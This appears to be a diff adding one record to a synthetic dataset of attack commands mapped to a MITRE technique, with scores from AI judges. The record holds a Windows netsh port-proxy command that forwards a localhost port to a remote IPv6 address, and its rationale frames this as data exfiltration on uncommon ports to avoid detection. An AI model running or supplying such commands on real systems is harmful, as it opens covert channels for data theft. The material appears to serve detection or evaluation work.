@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface portproxy add v4tov6 listenaddress=127.0.0.1 listenport=49171 connectaddress=2001:db8:ac:1::beef connectport=49172",
+  "explanation": "Sets a v4-to-v6 port proxy from localhost to a remote IPv6 address on uncommon ports, allowing tools to exfiltrate over an IPv6 medium via a loopback entry point (T1011).",
+  "rationale_steps": [
+    "Expose a localhost IPv4 port that forwards to an IPv6 destination.",
+    "Use high, uncommon ports (49171/49172) to minimize detection.",
+    "Enable applications restricted to IPv4 to send data over IPv6 as an alternate channel."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-eb5b681e",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid netsh portproxy v4tov6 syntax with correctly formatted parameters, addresses, and ports, no quoting or parsing issues.",
+        "semantic_score": 3,
+        "semantic_justification": "It will set up the intended IPv4-to-IPv6 localhost proxy enabling potential data forwarding, but it requires administrative privileges (not none) and aligns more with proxy/tunneling than T1011's 'other network medium' exfiltration.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T01:14:08.044596Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid netsh syntax, correct key=value parameter formatting, valid IPv4/IPv6 addresses, and valid port numbers.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly sets up a v4-to-v6 port proxy using netsh, which could facilitate tunneling traffic over IPv6, this is more accurately T1090 (Proxy/Port Forwarding) or T1572 (Protocol Tunneling) than T1011 (Exfiltration Over Other Network Medium), which specifically refers to using physically different network interfaces like cellular or Bluetooth rather than protocol-level IPv4/IPv6 translation on the same interface; additionally, netsh portproxy typically requires elevated privileges.",
+        "combined_score": 4.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T22:07:11.906342Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a perfectly well-formed netsh command with valid parameters, balanced key-value pairs, and correctly formatted IPv4 and IPv6 addresses.",
+        "semantic_score": 4,
+        "semantic_justification": "The command successfully creates a port proxy to tunnel traffic over IPv6 as intended, though it requires administrative privileges which contradicts the 'None' privilege level specified.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:07:16.014591Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
